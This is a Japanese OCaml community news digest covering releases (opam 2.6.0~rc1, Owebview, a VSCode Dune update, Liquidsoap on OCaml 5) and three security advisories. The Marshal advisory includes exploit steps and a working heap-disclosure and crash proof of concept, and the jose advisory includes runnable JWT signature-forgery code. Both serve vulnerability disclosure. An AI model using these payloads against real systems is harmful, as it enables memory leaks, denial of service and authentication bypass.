opam 2.6.0~alpha1

Archive: https://discuss.ocaml.org/t/ann-opam-2-6-0-alpha1/18372/5

このスレッドを引き継ぎ、Kate が発表しました

こんにちは、

最初のリリース候補 (2.6.0~rc1) が公開されました。問題がなければ、2.6.0 の安定版リリース前の最後のプレリリースになる予定です。 何か問題がありましたらお知らせください。

2.6.0~beta2 からの主な変更点

:hourglass_done: 主な変更点は、opam 2.5 と比較したパフォーマンス低下のもう一つの修正です。http リポジトリ（デフォルトの opam.ocaml.org など）からのパッケージが、リポジトリデータベースへの不要な読み取りによりインストールが遅くなっていた問題が修正されました (#7131)。

:open_book: 変更点の詳細については ブログ記事 をご覧ください。さらに詳細な情報は リリースノート または 変更履歴 でご確認いただけます。

試してみましょう！

アップグレード手順は変わっていません：

Unix システムの場合 

bash -c "sh <(curl -fsSL https://opam.ocaml.org/install.sh) --version 2.6.0~rc1"

Windows システムの PowerShell からの場合 

Invoke-Expression "& { $(Invoke-RestMethod https://opam.ocaml.org/install.ps1) } -Version 2.6.0~rc1"

問題が発生した場合は バグトラッカー にご報告ください。

Happy hacking, <> <> The opam team <> <> :camel:

tiny_httpd 0.22

こんにちは、tiny_httpd 0.22 のリリースをお知らせします。

Tiny_httpd は HTTP 1.1 サーバーで、websocket、SSE の基本的なサポートと、プラガブルな IO/並行処理（ダイレクトスタイルである限り）を備えています。依存関係をなるべく少なくシンプルに保つことを目標としており、それにもかかわらず 2019 年からずっと問題なく動作しています™。このリリースは主にバグ修正です（バグ報告がどこから来たのかについては、意味深な目くばせをするに留めておきます）。

Owebview 0.1 — OCaml からネイティブデスクトップウィンドウに Web UI を表示

Archive: https://discuss.ocaml.org/t/ann-owebview-0-1-native-desktop-windows-with-a-web-ui-from-ocaml/18521/1

Korkorran が発表しました

みなさん、こんにちは、

Owebview の最初のリリースを発表できて嬉しいです。これは webview の OCaml バインディングで、OCaml アプリに組み込み Web レンダリングエンジンを埋め込むことができます。opam で利用可能になりました： 

opam install owebview

Owebview は OS ネイティブの Web エンジンをバックエンドとするネイティブウィンドウを開きます。macOS では WebKit、Linux では WebKitGTK、Windows では WebView2 を使用し、OCaml から制御できます。Electron も、バンドラーも、パッケージ化されたブラウザも不要です。シングル実行ファイルといくつかの HTML だけです。

なぜ Owebview が OCaml の GUI に最適なソリューションであるかについてのブログ記事もご覧ください。

three.js ライブラリを使ったサンプルウィンドウ

ネイティブ依存関係

システムの Web エンジンのみで、それ以外は必要ありません：

  • macOS — WebKit / Cocoa は既にシステムに含まれています。インストール不要です。
  • Linux — gtk+-3.0 と webkit2gtk-4.1 が必要で、conf-gtk3-webkit opam パッケージ（本リリースとあわせて公開）によって取り込まれるため、opam install でお使いのディストリビューション向けの depexts が解決されます。
  • Windows — WebView2 ランタイムは Windows 10 および 11 に同梱されています。SDK ヘッダーはビルド時に NuGet キャッシュから検索されます（nuget install Microsoft.Web.WebView2）。

webview ヘッダー自体は vendored されているため、ビルド時に何かがフェッチされることはなく、プラットフォームのコンパイル/リンクフラグは dune-configurator スクリプトによって検出されます。

サンプル

リポジトリにはいくつかの実行可能なサンプルが含まれています： 

dune exec examples/hellowv/hellowv.exe          # バインディング、アセット、Dock アイコン
dune exec examples/timer/timer_posix.exe        # スレッド + ディスパッチ
dune exec examples/timer/timer_lwt.exe          # 同じもの、Lwt で動作
dune exec examples/d3/d3.exe                    # D3.js チャート
dune exec examples/three/three.exe              # three.js による WebGL
dune exec examples/js_of_ocaml/hellowv.exe      # フロントエンドも OCaml で書かれたもの

最後のサンプルは一つの言語でエンドツーエンドを実現するアイデアに興味がある方には特におすすめです。ページのロジックは Brr を使って書かれ、js_of_ocaml でコンパイルされているため、ブリッジの両側が OCaml になります。

チュートリアル

最初のウィンドウ表示から完全なアプリケーションまでを段階的に構築する 6 ステップのチュートリアルがあります。ディスク上のアセット、JS ↔ OCaml ブリッジ、Lwt を使った非同期バックエンド、100% OCaml フロントエンド、アプリケーションアイコンのプラットフォーム固有の詳細などが含まれています。

設計方針

これは意図的に 薄い バインディングです。C API に近い形を保ち、より高レベルな利便性は呼び出し元に委ねています。特に、バインディングの引数と結果は JSON テキスト として交換されるため、JSON ライブラリの選択はユーザー次第です。

フィードバック募集、特に Linux について

Owebview は macOS、Windows、Fedora、Ubuntu でテストされています。 他の Linux ディストリビューションでのビルドと動作についての報告は特に有益です。コンパイルできるか、depexts は解決されるか、webkit2gtk-4.1 バックエンドはお使いのディストリビューションで期待通りに動作するか、デスクトップ環境での Dock アイコンはどうなるか、なども教えていただければ幸いです。Windows に関する報告も歓迎します。

このライブラリに興味がある方は、frederic.ln.lang@gmail.com までメールをお送りください。

Marshal の整数オーバーフローによるヒープ外読み取り

OCaml の Marshal デシリアライザーの長さ検証ロジックにおける整数オーバーフローにより、細工されたシリアライズオブジェクトが CVE-2026-28364 修正で追加されたすべての境界チェックをバイパスし、Marshal.from_bytes / Marshal.from_string（および C API の caml_input_value_from_block）からヒープ境界外読み取りが発生します。

根本原因

runtime/intern.c はデータ長の宣言値を入力バッファと照合しますが、この検証にはラップアラウンドが起きうる符号なし 64 ビット加算が使われています： 

/* caml_input_val_from_bytes, intern.c:1038 */
if (ofs + h.header_len + h.data_len > caml_string_length(str))
   caml_failwith("input_val_from_string: bad length");

h.data_len は完全に攻撃者が制御可能です（Intext_magic_number_big の場合、ストリームから直接読み取る 8 バイトフィールド）。data_len >= 2^64 - (ofs + h.header_len) とすると、合計がラップアラウンドして小さな値になり、チェックが通過します。

CVE-2026-28364 の修正では以下が追加されました： 

/* intern.c:1043 (修正で追加) */
s->intern_src_end = s->intern_src + h.data_len;   /* バッファの前を指すポインタにラップアラウンド */

intern_src_end が intern_src より前のアドレスにラップアラウンドするため、修正で追加されたすべての intern_check_read() 境界チェック（len > end - src で差分が負になり巨大な uintnat に昇格）が現実的な長さに対して偽と評価されます。そしてパーサー（intern_rec）は攻撃者制御の読み取り長（readblock で最大 Max_wosize バイト）を入力バッファを大きく超えたメモリに対して実行します。

OCaml 側の stdlib/marshal.ml のラッパー検証も同じラップアラウンドを通じて caml_marshal_data_size（intern.c:1116-1150）経由でバイパスされます： 

return Val_long((header_len - 16) + data_len);   /* 0 または負にラップアラウンド */

Marshal.from_bytes（marshal.ml:55-62）は最初に data_size_unsafe を呼び出し、ラップアラウンドした len（0 または負）を受け取り、再チェック ofs > Bytes.length buff - (header_size + len) が通過します。

同じ未チェックのラップアラウンドは caml_input_value_from_buffer（intern.c:1080）にも存在し、公開 C API の caml_input_value_from_block および caml_input_value_from_malloc で使用されています。これらには OCaml 側の検証がまったくありません。

エクスプロイトの手順

  1. 32 バイトのヘッダーを作成：Intext_magic_number_big + 4 バイトのパディング + data_len = 2^64 - 16 + num_objects = 0 + whsize = 0。
  2. 有効なオブジェクトコードバイトストリームを追加（例：「small string」コード 0x3F = 31 バイト、または任意の長さの CODE_STRING32）。
  3. Marshal.from_bytes buf 0（または Marshal.from_string）を呼び出す。
  4. data_size_unsafe が 0 を返し、OCaml 側のチェックが通過。
  5. C 側のチェック 0 + 32 + (2^64-16) = 16 > len が通過（ラップアラウンドにより）。
  6. intern_src_end が buf + 16 にラップアラウンドし、すべての intern_check_read が通過。
  7. intern_rec が攻撃者指定の len で readblock(s, dest, len) を実行し、 バッファ終端を超えたヒープメモリを返された文字列に memcpy（情報漏洩）、 または巨大な len（SIGBUS/SIGSEGV、DoS）。

概念実証

テスト環境: macOS arm64、OCaml 5.5.0（Homebrew）、ocamlopt。

  • 1. ヒープ情報開示（クリーン、クラッシュなし）
    let () =
   let buf = Bytes.create 40 in
   Bytes.set buf 0 (Char.chr 0x84); Bytes.set buf 1 (Char.chr 0x95);
   Bytes.set buf 2 (Char.chr 0xa6); Bytes.set buf 3 (Char.chr 0xbf);
   for i = 4 to 7 do Bytes.set buf i '\000' done;
   for i = 8 to 15 do Bytes.set buf i '\xff' done;
   Bytes.set buf 15 (Char.chr 0xf0);          (* data_len = 2^64 - 16 *)
   for i = 16 to 31 do Bytes.set buf i '\000' done;  (* num_objects = whsize = 0 *)
   Bytes.set buf 32 (Char.chr 0x3f);          (* small string, len 31 *)
   for i = 33 to 39 do Bytes.set buf i 'A' done;     (* 実際には 7 バイトのみ続く *)
   let s : string = Marshal.from_bytes buf 0 in
   Printf.printf "len=%d content=%S\n" (String.length s) s

    出力（40 バイトのバッファを超えた 24 バイトが返された文字列にリークされている）： 

    len=31 
content="AAAAAAA\000\000\000\000\000\000\007\000\b\000\000\000\000\000\000\152\018\001\003\001\000\000\000"
  • 2. サービス拒否（クラッシュ）

    同じヘッダー。ストリームバイト 32 = 0x0A（CODE_STRING32）、ビッグエンディアン 0x40000000（1 GB）の長さ、37 バイトのバッファ： 

    $ ./crash; echo "exit=$?"
exit=138        (128 + SIGBUS)

JOSE: RSA 署名検証の欠如

opam パッケージ「jose」は RSA 署名を一切検証しません。エンコーディングが PKCS1 であることは確認しますが、公開鍵での検証を行いません。

再現方法

jose 0.10.0 で、以下のコードは同じ鍵で 2 つのトークンに署名し、一方のペイロードをもう一方の署名に結合します： 

let () = Mirage_crypto_rng_unix.use_default ()

let key =
   Jose.Jwk.make_priv_rsa (Mirage_crypto_pk.Rsa.generate ~bits:2048 ())

let sign sub =
   Jose.Jwt.sign key ~payload:(`Assoc [ ("sub", `String sub) ])
   |> Result.get_ok |> Jose.Jwt.to_string

let seg n token = List.nth (String.split_on_char '.' token) n

let alice = sign "alice" and admin = sign "admin"

(* alice のヘッダーと署名、admin のペイロード *)
let forged = String.concat "." [ seg 0 alice; seg 1 admin; seg 2 alice ]

match
   Jose.Jwt.unsafe_of_string forged
   |> Result.get_ok
   |> Jose.Jwt.validate ~jwk:(Jose.Jwk.pub_of_priv key) 
~now:(Ptime_clock.now ())
with
   | Ok t ->
     print_endline
       ("accepted, sub = " ^ Option.get (Jose.Jwt.get_string_claim t "sub"))
   | Error _ -> print_endline "rejected"

dune ファイル： 

(executable (name repro)
(libraries jose mirage-crypto-pk mirage-crypto-rng.unix ptime.clock.os))

これは "accepted, sub = admin" と出力されます。

回避策

現在、既知の回避策はありません。

Cstruct のインデックスバグによるフィルタ出力の破損と逆方向パース結果の誤り

cstruct のいくつかの関数が誤ったデータを使用する可能性があり、予期しない例外の発生や破損したデータの返却につながります。

影響

  • Cstruct.filter_map は保持バイトを元の入力位置に書き込むため、前方のバイトが削除されると破損した出力が生成されます。
  • Cstruct.tail ~rev:true は 1 バイトではなく 2 バイトを削除し、1 バイトのビューに対して例外を発生させます。
  • Cstruct.cuts ~rev:true は入力を誤ったデータと比較し、誤った位置で分割し、要求されたビューの外側のオフセットを使って結果を構築する可能性があります。
  • Cstruct.find および Cstruct.find_sub ~rev:true は非ゼロオフセットのビューを操作する際に、誤った位置のスライスを返す可能性があります。

これらは論理的なインデックスおよび境界計算エラー（CWE-682）であり、直接的なメモリ安全性の脆弱性ではありません。ただし、影響を受ける操作は破損したデータを返したり、予期しない例外を発生させたり、入力を誤って分割したり、要求された Cstruct ビューの外側（ただしバッキングバッファ内）のバイトを返す可能性があります。

セキュリティに関わるパーサーでは、検証のバイパス、サービス拒否、または隣接バッファ内容の意図しない開示を引き起こす可能性があります。

回避策

cstruct をアップグレードできないユーザーは対応するソース変更をバックポートする必要があります。これらはライブラリのバグによるものであり、設定ベースの緩和策はありません。

VSCode での Dune パッケージ管理サポート

Archive: https://discuss.ocaml.org/t/update-dune-package-management-support-in-vscode/18523/1

PizieDust が発表しました

Dune Package Management（DPM）に関する OCaml VSCode Extension の改善をお知らせします。このアップデートにはいくつかのバグ修正と使い勝手の向上が含まれています。 今回のアップデートで、DPM をサンドボックスとして有効化するには：

  • まず、サンドボックスリストから「Dune Package Management」を選択します。
  • 次に、お使いのコンピューターにインストールされている dune バイナリの一覧が表示されます。dune バイナリを選択すると、プロジェクトで DPM が有効化されます。

DPM が有効化されると、バックグラウンドで ocaml-lsp-server が初期化され、拡張機能は有益な提案を行います（例：DPM をまだ有効化していない場合に「lock」することを提案します）。（DPM の有効化は dune-workspace ファイルで行うか、dune pkg lock を実行することで行えます。） 両方が完了すると、うまく動作するようになります。

注意：

  • インストール済み依存関係の一覧表示、パッケージのアップグレードとアンインストールなど、opam サンドボックスでサポートされているその他の機能は、DPM ではまだサポートされていません。
  • watch モードで dune を実行したり、長時間実行される dune コマンドを実行したりすると、現在実行中のプロセスが終了するまで dune ビルドディレクトリがロックされるため、VSCode 上の DPM が正常に動作しない場合があります。

プロジェクトボードで行った変更の詳細をご確認いただけます。 この作業は Pixie Dust、Timéo Arnouts、Ulysse Gerard、Sonja Heinze、Shon Feder、Ali Caglayan、Sudha Parimala によって実現されました。

Liquidsoap 2.5.x: OCaml 5.x 並行処理の実践的な研究

Archive: https://discuss.ocaml.org/t/liquidsoap-2-5-x-a-practical-study-of-ocaml-5-x-concurrency/18525/1

Romain Beauxis が発表しました

【開示：以下にリンクされているコードとコンテンツの一部は自動化ツールの助けを借りて作成されています。この投稿はそうではありません。】

数年間保留にした末、ついに liquidsoap プロジェクトを OCaml 5 に移行する時が来ました！OCaml 5 の GC ペーシングを制御するための優れた取り組みにより、メモリの問題は過去のものになったという確信が持てました。

私たちにとっての主な動機は、effects のやや型破りな（と私は思っています）使い方です。liquidsoap スクリプトの実行中にローカルで発生する操作の結果をグローバルに収集するためのものです。詳細はこちらで説明されています。

OCaml 5 への切り替えが完了したら、その恩恵を測定する時です！liquidsoap の特殊な立場は、I/O 集約型と CPU 集約型の両方の処理を行う点です。ネットワークやディスク操作の I/O と、メディアのエンコードおよびデコードの CPU です。そのため、両面をテストする良い機会になりました！

最初のブログ記事には、このトピックに関する詳細な情報が多く含まれており、私たちがいかにしてスケジューラー（duppy と名付けています）をマルチコアの利点を最大限に活用できるように改良したかについても書かれています。初期設計（node/libev と非常に似ています）から 10 年後に、I/O ワークフローでその設計が正しかったことが確認されて嬉しかったです。

しかし CPU バウンドのワークフローでは、最初の実験が非常に重い映像処理に集中していたため、主に OCaml の外で行われるメディア計算が支配的で、あまり興味深い結果は得られませんでした。

Liquidsoap はリアルタイムストリーミングループを実行しているため、マルチコアによる超高速処理の利点は、時間を先取りしないために 70% の時間を待機する必要があることでほぼ失われてしまうという面もあります。

しかし、もっとよく考えてみると、良いユースケースは対照的に、1 つのオーディオエンコーディングが複数のソースで共有される状況です。オーディオエンコーディングはすでに計算量がはるかに少なく、共有される場合、OCaml レベルでの並行処理がより関連性を持ってきます。

これは2 番目のブログ記事で確認されました。すべてのクロック（リアルタイムでコンテンツを生成する抽象化）をシステムスレッドから duppy のドメインバックタスクに変換したところ…ついに実際の恩恵を確認できました：
